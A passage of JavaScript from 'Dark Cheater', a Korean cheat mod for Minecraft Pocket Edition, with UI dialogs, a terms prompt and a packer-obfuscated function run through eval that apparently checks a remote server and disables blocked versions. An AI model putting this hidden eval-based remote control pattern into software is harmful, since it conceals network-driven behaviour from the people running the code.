if(widgetDrag){
if(ev.action==android.view.MotionEvent.ACTION_DOWN){
dou.seek = true;
}
if(dou.seek2>100&&ev.action==android.view.MotionEvent.ACTION_MOVE){
if(tf) w.update(ev.getRawX(), ev.getRawY(), w.getWidth(), w.getHeight());
else w.update(ctx.getWindowManager().getDefaultDisplay().getWidth()-ev.getRawX(), ev.getRawY(), w.getWidth(), w.getHeight());
}
if(ev.action==android.view.MotionEvent.ACTION_UP){
dou.seek = false;
dou.seek2 = 0;
}
}
return false;
}
catch(e){
Dark.showError(e);
}
}
}));
}

function checkDarkCheater(){
var code = function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('K a="\\k\\g\\f\\1g\\B\\b\\c\\z\\i\\i\\j\\B\\1e\\t\\b\\o\\t\\b\\M\\b\\i\\c\\j\\y\\f\\h\\c\\b\\f\\q\\b\\b\\o\\f\\z\\h\\m\\i\\g\\k\\m\\F\\b\\b\\o\\G\\s\\k\\c\\h\\b\\f\\h\\c\\J\\1c\\h\\l\\b\\j\\h\\p\\c\\f\\c\\N\\c\\p\\t\\b\\c\\f\\j\\o\\j\\p\\q\\c\\f\\p\\s\\k\\c\\h\\b\\f\\y\\c\\b\\q\\g\\m\\l\\f\\F\\b\\b\\o\\1b\\c\\b\\f\\x\\c\\b\\1a\\h\\b\\k\\b\\B\\f\\J\\i\\k\\b\\c\\Z\\g\\f\\p\\s\\g\\l\\c\\f\\b\\g\\M\\b\\i\\k\\h\\x\\f\\l\\o\\s\\k\\b\\f\\l\\j\\W\\c\\f\\b\\g\\j\\l\\b\\f\\t\\l\\c\\i\\z\\x\\c\\h\\b\\f\\q\\b\\b\\o\\T\\u\\u\\m\\j\\i\\A\\b\\g\\i\\h\\j\\m\\g\\v\\m\\g\\b\\q\\g\\y\\c\\v\\p\\g\\v\\A\\i\\u\\C\\C\\C\\S\\u\\m\\j\\i\\A\\G\\q\\c\\j\\b\\c\\i\\v\\b\\N\\b\\f\\k\\h\\Q\\g\\O".Y("\\f");P=E;R{a[w]=I U[a[0]][a[1]]();V[a[2]][a[3]][a[4]][a[5]](a[18])[a[6]](I X[a[7]][a[3]][a[8]][a[9]][a[10]](a[19]))[a[11]]()[a[12]](a[w]);a[w][a[13]]();a[H]=17(a[w][a[14]]());a[D]=a[H][a[14]]()[a[15]]("d");a[r]=E;1d(K n 1f a[D]){L(a[D][n]==1h){a[r]=1i;1j}}L(a[r]){1k()}1l[a[16]](a[1m],a[r]);1n(a[r])}1o(e){}',62,87,'||||||||||nox|x74|x65|||xXY|x6F|x6E|x72|x61|x69|x73|x64||x70|x63|x68|24|x6C|x75|x2F|x2E|21|x67|x6D|x41|x6B|x79|x30|23|true|x48|x43|22|new|x77|var|if|x53|x78|x32|darkCheaterActive|x66|try|x2B|x3A|java|android|x76|org|split|x54||||||||String|||x45|x47|x49|for|x4F|in|x42|version|false|break|alertMessage|Dark|20|hyperCheck|catch'.split('|'),0,{});
eval(code);
}

function alertMessage(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var text = new android.widget.TextView(ctx);
text.setText("이 버전의 Dark Cheater(버전 "+version+")는 무단 공유 등의 이유로 제작자가 작동을 차단해서 작동하지 않습니다. 제작자의 블로그에서 최신 버전을 받아 주세요.");
text.setTextSize(17);
text.setTextColor(white);
layout.addView(text);
var maker = new android.widget.TextView(ctx);
maker.setText("\n© 2015-2017 Dark Tornado, All rights reserved.\n");
maker.setTextSize(11);
maker.setTextColor(white);
maker.setGravity(center);
layout.addView(maker);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("Dark Cheater 경고");
dialog.setNegativeButton("확인", null);
dialog.setNeutralButton("차단 이유", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
showMessage();
}
}));
dialog.setPositiveButton("제작자 블로그", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
var uri = new android.net.Uri.parse("http://blog.naver.com/dt3141592");
var link = new android.content.Intent(android.content.Intent.ACTION_VIEW, uri);
ctx.startActivity(link);
}
}));
dialog.show();
var noti = new android.app.Notification.Builder(ctx);
noti.setSmallIcon(android.R.drawable.ic_menu_info_details);
noti.setContentTitle("Dark Cheater 경고");
noti.setContentText("이 버전의 Dark Cheater는 더 이상 작동하지 않습니다.");
noti.setContentInfo("Dark Cheater "+version);
noti.setOngoing(false);
ctx.getSystemService(android.content.Context.NOTIFICATION_SERVICE).notify(1, noti.getNotification());
}
catch(e){
Dark.toast(e+", "+e.lineNumber);
}
}
}));
}

function showMessage(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var web = new android.webkit.WebView(ctx);
web.setWebChromeClient(new android.webkit.WebChromeClient());
web.setWebViewClient(new android.webkit.WebViewClient());
web.loadUrl("http://darktornado.dothome.co.kr/000+/dcm/"+version+".txt");
layout.addView(web);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("다크 치터 "+version+" 차단 이유");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}

function hyperCheck(block){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
hyperCheckEnabled = false;
if(Utils.isPro()) var path = BlocklauncherRoot+".pro/";
else var path = BlocklauncherRoot+"/";
var folder = new java.io.File(path+"darkCheater/");
folder.mkdir();
if(block) Dark.hyperSave("blockData", version);
else Dark.hyperSave("blockData", false);
}
catch(e){
//Dark.toast(e+", "+e.lineNumber);
}
}
}));
}

function showTerms(str){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
dialog.setTitle("Dark Cheater 이용 약관");
dialog.setMessage(str);
dialog.setNegativeButton("거절", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(btn!=null){
btn.dismiss();
btn = null;
}
Dark.toast("약관에 동의하셔야 다크 치터를 사용하실 수 있습니다.");
}
}));
dialog.setPositiveButton("동의", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
Dark.makeButton();
Dark.save("info5", true);
Dark.toast("약관에 동의하셨습니다.\n 이제 다크 치터를 사용하실 수 있습니다.");
}
}));
dialog.setCancelable(false);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}

